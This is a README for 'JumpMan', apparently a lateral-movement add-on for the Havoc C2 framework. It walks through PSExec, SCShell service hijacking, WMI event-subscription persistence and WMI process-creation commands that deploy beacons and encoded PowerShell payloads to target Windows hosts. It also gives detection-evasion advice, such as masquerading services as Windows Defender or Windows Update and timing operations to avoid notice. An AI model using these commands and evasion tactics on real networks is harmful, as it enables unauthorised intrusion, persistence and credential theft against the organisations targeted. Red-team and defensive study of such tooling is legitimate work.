# JumpMan - Advanced Lateral Movement Tool

## 📋 Overview

JumpMan is a comprehensive lateral movement tool integrated into the Havoc C2 framework. It provides red teams with multiple lateral movement techniques, automated target management, and flexible execution options for efficient network traversal and privilege escalation across Windows environments.

## 🎯 Key Features

### **Multiple Lateral Movement Methods**
JumpMan supports 4 distinct lateral movement techniques, each optimized for different scenarios:

#### **1. PSExec (Service-Based Execution)**
- **Classic Service Deployment**: Creates Windows service for remote execution
- **Custom Executable Support**: Upload and execute custom payloads
- **Administrative Privileges**: Requires local admin rights on target
- **High Reliability**: Well-tested technique with broad compatibility

#### **2. SCShell (Service Hijacking)**
- **Service Modification**: Hijacks existing Windows services
- **Stealth Execution**: Leverages legitimate service infrastructure
- **Minimal Footprint**: No new service creation required
- **Evasion Friendly**: Harder to detect than new service creation

#### **3. WMI EventSub (Event Subscription)**
- **Persistence Mechanism**: Creates WMI event subscription
- **VBScript Execution**: Executes VBScript payloads via WMI
- **Long-term Access**: Provides persistent access channel
- **Advanced Technique**: Leverages WMI infrastructure

#### **4. WMI ProcCreate (Process Creation)**
- **Direct Process Execution**: Creates processes via WMI
- **Credential Support**: Optional credential specification
- **Flexible Commands**: Execute any command or payload
- **Network Authentication**: Works across domain boundaries

### **Bulk Target Management**
- **File-Based Targets**: Load targets from text files
- **Manual Entry**: Add individual targets through UI
- **IP and Hostname Support**: Flexible target specification
- **Target Validation**: Input validation and formatting

### **Credential Integration**
- **Optional Credentials**: Specify domain credentials for authentication
- **Domain/Workgroup Support**: Cross-domain lateral movement
- **Credential Reuse**: Apply same credentials across multiple targets
- **Secure Handling**: Safe credential storage during execution

### **Execution Controls**
- **Configurable Delays**: Prevent detection with timing controls
- **Stop on Success**: Halt execution after first successful compromise
- **Progress Tracking**: Real-time execution status monitoring
- **Result Logging**: Comprehensive success/failure tracking

## 🚀 Usage Workflow

### **1. Select Lateral Movement Method**
```bash
# Choose technique based on environment and goals:
- PSExec: Reliable service-based execution (requires admin)
- SCShell: Stealthy service hijacking
- WMI EventSub: Persistent WMI event subscription
- WMI ProcCreate: Direct WMI process creation
```

### **2. Configure Target List**
```bash
# Option 1: Load from file
targets.txt:
192.168.1.10
192.168.1.11
WORKSTATION01
SERVER02.domain.com

# Option 2: Manual entry
Add individual targets through the UI
```

### **3. Set Execution Parameters**
```bash
# PSExec Configuration
Service Name: WindowsUpdate
Service Description: Windows Update Service Helper
Executable Path: C:\Windows\Temp\payload.exe

# WMI Configuration (optional credentials)
Domain: CORPORATE
Username: admin
Password: password123
```

### **4. Execute and Monitor**
```bash
# Start lateral movement campaign
# Monitor real-time progress in results table
# Review success/failure status for each target
```

## 🛠️ Lateral Movement Techniques

### **PSExec Method**
```bash
# Command structure
jump-exec psexec target service_name service_description executable_path

# Example
jump-exec psexec 192.168.1.10 WinDefend "Windows Defender Service" C:\temp\beacon.exe

# Requirements
- Local administrator privileges on target
- SMB access (port 445)
- Remote Registry access
- Service Control Manager access
```

### **SCShell Method**
```bash
# Command structure  
jump-exec scshell target service_name executable_path

# Example
jump-exec scshell WORKSTATION01 Spooler C:\Windows\System32\beacon.exe

# Requirements
- Service modification privileges
- Existing service to hijack
- SMB access for file operations
```

### **WMI EventSub Method**
```bash
# Command structure
jump-exec wmi-eventsub target [domain] [username] [password] vbscript_path

# Example
jump-exec wmi-eventsub 192.168.1.10 CORP admin password123 C:\temp\payload.vbs

# VBScript Example
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -enc <base64_payload>", 0, False

# Requirements
- WMI access (port 135, dynamic RPC)
- Administrative privileges
- VBScript execution capability
```

### **WMI ProcCreate Method**
```bash
# Command structure
jump-exec wmi-proccreate target [domain] [username] [password] command

# Example
jump-exec wmi-proccreate SERVER01 DOMAIN admin pass123 "powershell.exe -enc <payload>"

# Requirements
- WMI access and DCOM
- Process creation privileges
- Network authentication capability
```

## 📊 Execution Results

### **Results Table Columns**
- **Target**: IP address or hostname
- **Method**: Lateral movement technique used  
- **Status**: Success, Failed, or In Progress
- **Output**: Command output or error message
- **Timestamp**: Execution time

### **Status Indicators**
- **✅ Success**: Lateral movement completed successfully
- **❌ Failed**: Execution failed (credentials, access, network)
- **⏳ In Progress**: Currently executing
- **⏸️ Pending**: Queued for execution

## ⚙️ Advanced Configuration

### **PSExec Settings**
```bash
# Service Configuration
Service Name: [Custom name for stealth]
Service Description: [Realistic description]
Executable Path: [Full path to payload]

# Common Service Names
- WindowsUpdate: Windows Update Helper
- WinDefend: Windows Defender Service  
- AudioSrv: Windows Audio Service
- NetFramework: .NET Framework Helper
```

### **WMI Authentication**
```bash
# Domain Authentication
Domain: CORPORATE.LOCAL
Username: administrator
Password: password123

# Local Authentication
Domain: .
Username: Administrator
Password: localpass456

# Current User Context
Leave credentials empty to use current beacon context
```

### **Timing Configuration**
```bash
# Execution Delays
Delay Between Targets: 5000ms (5 seconds)
Connection Timeout: 30 seconds
Command Timeout: 60 seconds

# Stop Conditions
Stop on First Success: Yes/No
Max Concurrent: 1 (sequential execution)
```

## 🛡️ OPSEC Considerations

### **Detection Avoidance**
- **Service Names**: Use realistic Windows service names
- **Timing Controls**: Avoid rapid successive attempts
- **Credential Rotation**: Change credentials between campaigns
- **Method Variation**: Mix techniques to avoid patterns

### **Logging Awareness**
```bash
# PSExec generates:
- Service installation logs (System Event Log)
- Service start/stop events
- File creation events

# WMI generates:
- WMI operation logs
- Process creation events (if enabled)
- Network authentication logs

# SCShell generates:
- Service modification events
- Unexpected service behavior logs
```

### **Network Footprint**
```bash
# Common Ports and Protocols
PSExec: SMB (445), RPC (135 + dynamic)
WMI: RPC (135), DCOM (dynamic high ports)
Authentication: Kerberos (88) or NTLM

# Minimize Detection
- Use existing admin accounts
- Leverage service accounts when possible
- Time operations during business hours
- Space out execution across time
```

## 🎯 Red Team Use Cases

### **Initial Access Expansion**
```bash
# Scenario: Single compromised workstation
1. Extract local credentials
2. Use PSExec to move to similar workstations
3. Harvest additional credentials
4. Escalate to server infrastructure
```

### **Domain Privilege Escalation**
```bash
# Scenario: Domain user compromise
1. Identify systems where user has local admin
2. Use WMI ProcCreate with current credentials
3. Deploy additional payloads
4. Search for cached DA credentials
```

### **Persistent Access Establishment**
```bash
# Scenario: Temporary access window
1. Use WMI EventSub for persistence
2. Create multiple persistent footholds
3. Establish backup access methods
4. Maintain long-term network presence
```

### **Cross-Domain Movement**
```bash
# Scenario: Multi-domain environment
1. Identify trust relationships
2. Use domain credentials for WMI authentication
3. Move across trust boundaries
4. Establish presence in multiple domains
```

## 📈 Integration with Havoc

### **Beacon Integration**
- **Current Beacon Context**: Uses current beacon's privileges
- **New Beacon Generation**: Creates new beacons on successful lateral movement
- **Session Management**: Automatic beacon tracking and organization

### **Credential Manager Integration**
```bash
# Workflow Integration
1. Use CredentialManager stored credentials
2. Apply credentials across JumpMan targets
3. Store newly discovered credentials
4. Build comprehensive credential database
```

### **ControlFreak Coordination**
```bash
# Multi-Beacon Operations
1. Use JumpMan to establish multiple beacons
2. Manage new beacons through ControlFreak
3. Execute coordinated commands across network
4. Maintain operational awareness
```

## 🔍 Troubleshooting

### **Common Failures**

#### **PSExec Failures**
```bash
# Access Denied
- Verify local admin privileges
- Check SMB connectivity (port 445)
- Validate target system allows remote connections

# Service Creation Failed  
- Ensure unique service name
- Check Windows Firewall settings
- Verify Remote Registry service running
```

#### **WMI Failures**
```bash
# RPC Server Unavailable
- Check WMI service running on target
- Verify RPC/DCOM connectivity
- Validate firewall rules (port 135)

# Authentication Failed
- Verify domain credentials
- Check account lockout policies
- Validate domain trust relationships
```

#### **Network Connectivity**
```bash
# General Network Issues
- Verify target system online
- Check routing and VPN connectivity  
- Validate DNS resolution
- Test basic network connectivity
```

### **Debug Information**
- **Verbose Logging**: Enable detailed command output
- **Network Traces**: Monitor network traffic during execution
- **Event Logs**: Review Windows Event Logs on targets
- **Beacon Callbacks**: Monitor new beacon registration

---

## 🔐 Security Best Practices

### **Credential Management**
- Use dedicated lateral movement accounts
- Implement credential rotation
- Monitor for account lockouts
- Maintain operational security

### **Network Hygiene**
- Minimize persistent connections
- Clean up temporary files
- Remove created services after use
- Monitor for defensive responses

### **Operational Planning**
- Map network topology before execution
- Identify high-value targets
- Plan fallback methods
- Coordinate with team members

---

*JumpMan provides comprehensive lateral movement capabilities with multiple techniques, automated execution, and flexible targeting options, making it essential for efficient network traversal during red team operations.*